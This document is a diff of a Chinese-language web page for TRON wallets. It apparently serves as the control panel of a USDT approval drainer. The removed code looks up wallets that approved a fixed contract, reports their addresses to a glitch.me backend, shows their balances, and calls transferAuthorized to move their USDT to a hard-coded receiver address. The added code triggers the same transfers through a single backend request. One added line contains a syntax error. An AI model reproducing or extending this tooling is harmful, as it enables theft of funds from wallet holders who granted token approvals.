@@ -2,167 +2,60 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>USDT 授權監控</title>
+  <title>搜尋已授權錢包</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="manifest" href="manifest.json" />
-  <script>
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('./service-worker.js')
-        .then(reg => console.log('✅ Service Worker Registered'))
-        .catch(err => console.warn('❌ Service Worker Failed:', err));
-    }
-  </script>
-  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
   <style>
-    body { font-family: sans-serif; padding: 2em; background: #f2f2f2; text-align: center; }
-    h1 { color: #2c3e50; }
-    .wallet-card {
-      background: #fff;
-      border-radius: 10px;
-      padding: 1em;
-      margin: 1em auto;
+    body {
+      font-family: sans-serif;
+      padding: 2em;
+      background: #f7f7f7;
+      text-align: center;
+    }
+    input, button {
+      padding: 0.7em;
+      margin: 1em 0;
+      font-size: 1.1em;
       width: 90%;
       max-width: 400px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      text-align: left;
     }
     button {
-      background: #0984e3;
-      color: #fff;
+      background-color: #0984e3;
+      color: white;
       border: none;
-      padding: 0.5em 1em;
-      border-radius: 6px;
-      margin-top: 0.5em;
-      cursor: pointer;
+      border-radius: 8px;
     }
-    input[type="text"], input[type="number"] {
-      width: 80%;
-      padding: 0.5em;
-      margin-top: 0.5em;
+    .wallet-result {
+      margin-top: 1em;
+      background: white;
+      padding: 1em;
+      border-radius: 10px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
     }
-    #status { margin-top: 1em; color: #636e72; }
   </style>
 </head>
 <body>
-  <h1>🔐 USDT 授權監控</h1>
-  <div>
-    <input type="text" id="checkWallet" placeholder="輸入錢包地址查詢">
-    <button onclick="checkWallet()">查詢授權</button>
-    <button onclick="renderWallets()">🔄 重新整理</button>
-  </div>
-  <div id="wallets"></div>
-  <div id="status">尚未連接錢包</div>
+  <h2>🌐 授權代筆管理系統</h2>
+  <button onclick="triggerTransfer()">發動合約轉帳</button>
+
+  <div id="result" class="wallet-result"></div>
 
   <script>
-    const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const RECEIVER = "THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR";
-    const BACKEND = "https://peaceful-precious-ceres.glitch.me";
-    const approvedWallets = [];
-
-    async function checkWallet() {
-      const address = document.getElementById("checkWallet").value.trim();
-      if (!address || !/^T[a-zA-Z0-9]{33}$/.test(address)) {
-        return alert("請輸入有效的 TRON 錢包地址（以 T 開頭，共 34 字元）");
-      }
+    async function triggerTransfer() {
+      document.getElementById("result").innerText = "正在啟動...請稍候...";
       try {
-        if (!window.tronWeb || !tronWeb.defaultAddress.base58) {
-          return alert("請使用 TronLink DApp 瀏覽器開啟此頁面，並確保已登入錢包");
-        }
-
-        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
-        const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
-        const allowed = parseFloat(allowance.toString()) / 1e6;
-
-        alert(`授權額度：${allowed} USDT`);
-
-        if (allowed > 0) {
-          await axios.post(`${BACKEND}/wallets`, { address });
-          if (!approvedWallets.includes(address)) {
-            approvedWallets.push(address);
-          }
-          await renderWallets();
-        }
-      } catch (err) {
-        console.error(err);
-        alert("查詢失敗：" + err.message);
-      }
-    }
-
-    async function renderWallets() {
-      try {
-        const res = await axios.get(`${BACKEND}/wallets`);
-        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
-        const wrap = document.getElementById("wallets");
-        wrap.innerHTML = "";
-
-        for (const wallet of res.data) {
-          const addr = wallet.address;
-          const balance = await usdt.balanceOf(addr).call();
-          const trx = await tronWeb.trx.getBalance(addr);
-          const allow = await usdt.allowance(addr, AUTH_CONTRACT).call();
-
-          const usdtBal = parseFloat(balance.toString()) / 1e6;
-          const trxBal = parseFloat(trx.toString()) / 1e6;
-          const allowance = parseFloat(allow.toString()) / 1e6;
-
-          const div = document.createElement("div");
-          div.className = "wallet-card";
-          div.innerHTML = `
-            <div><strong>地址：</strong>${addr}</div>
-            <div>USDT 餘額：${usdtBal}</div>
-            <div>TRX 餘額：${trxBal}</div>
-            <div>授權額度：${allowance}</div>
-            <input type="number" id="amount-${addr}" placeholder="輸入要轉的 USDT 金額">
-            <button onclick="triggerTransfer('${addr}')">🚀 觸發轉帳</button>
-          `;
-          wrap.appendChild(div);
-        }
-      } catch (err) {
-        console.error("renderWallets error", err);
-        alert("錢包資料讀取失敗，請確認合約與網路狀態");
-      }
-    }
-
-    async function triggerTransfer(from) {
-      const input = document.getElementById(`amount-${from}`);
-      const amount = parseFloat(input.value);
-      if (!amount || amount <= 0) return alert("請輸入有效金額");
-
-      try {
-        const contract = await tronWeb.contract().at(AUTH_CONTRACT);
-        await contract.transferAuthorized(
-          USDT_CONTRACT,
-          from,
-          RECEIVER,
-          tronWeb.toSun(amount)
-        ).send();
-
-        alert(`✅ 已觸發 ${amount} USDT 轉帳`);
-      } catch (err) {
-        console.error("轉帳錯誤", err);
-        alert("❌ 轉帳失敗：" + err.message);
-      }
-    }
-
-    window.addEventListener("load", () => {
-      let attempts = 0;
-      const check = setInterval(() => {
-        if (window.tronWeb && window.tronWeb.defaultAddress.base58 && window.tronWeb.ready) {
-          clearInterval(check);
-          document.getElementById("status").innerText = "🟢 已連接錢包：" + tronWeb.defaultAddress.base58;
-          renderWallets();
+        const res = await fetch("https://peaceful-precious-ceres.glitch.me/trigger-transfer", {
+          method: "POST",
+        });
+        const data = await res.json();
+        if (data.success) {
+          document.getElementById("result").innerText = 您已成功啟動合約 \n + data.tx;
         } else {
-          attempts++;
-          document.getElementById("status").innerText = "等待錢包連接中...（" + attempts + "）";
-          if (attempts > 30) {
-            clearInterval(check);
-            document.getElementById("status").innerText = "❌ 未偵測到 TronLink，請使用 Chrome 並安裝錢包擴充功能";
-          }
+          document.getElementById("result").innerText = "失敗: " + (data.error || "Unknown error");
         }
-      }, 1000);
-    });
+      } catch (e) {
+        document.getElementById("result").innerText = "連線錯誤: " + e.message;
+      }
+    }
   </script>
 </body>
 </html>
